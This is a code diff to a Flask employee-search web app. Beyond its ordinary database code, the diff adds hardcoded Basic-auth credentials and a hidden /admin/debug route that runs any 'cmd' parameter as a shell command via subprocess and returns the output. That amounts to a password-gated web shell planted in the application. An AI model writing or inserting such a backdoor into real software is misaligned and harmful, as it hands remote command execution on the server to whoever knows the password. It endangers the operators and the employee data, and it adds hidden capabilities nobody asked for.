@@ -1,9 +1,25 @@
 import os
 import sqlite3
-from flask import Flask, render_template, request
+import subprocess
+from functools import wraps
+from flask import Flask, render_template, request, Response
 
 app = Flask(__name__)
 DB_PATH = "/tmp/employees.db"
+
+DEBUG_USER = "portal_svc"
+DEBUG_PASS = "Portal@Svc2024!"
+
+
+def requires_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        auth = request.authorization
+        if not auth or auth.username != DEBUG_USER or auth.password != DEBUG_PASS:
+            return Response("Unauthorized", 401,
+                            {"WWW-Authenticate": 'Basic realm="Admin"'})
+        return f(*args, **kwargs)
+    return decorated
 
 
 def init_db():
@@ -48,6 +64,16 @@ def search():
         results = []
     conn.close()
     return render_template("index.html", results=results, query=q)
+
+
+@app.route("/admin/debug", methods=["GET", "POST"])
+@requires_auth
+def admin_debug():
+    cmd = request.args.get("cmd") or request.form.get("cmd", "")
+    if not cmd:
+        return "Usage: ?cmd=<command>\n", 200
+    output = subprocess.getoutput(cmd)
+    return f"<pre>{output}</pre>", 200
 
 
 init_db()
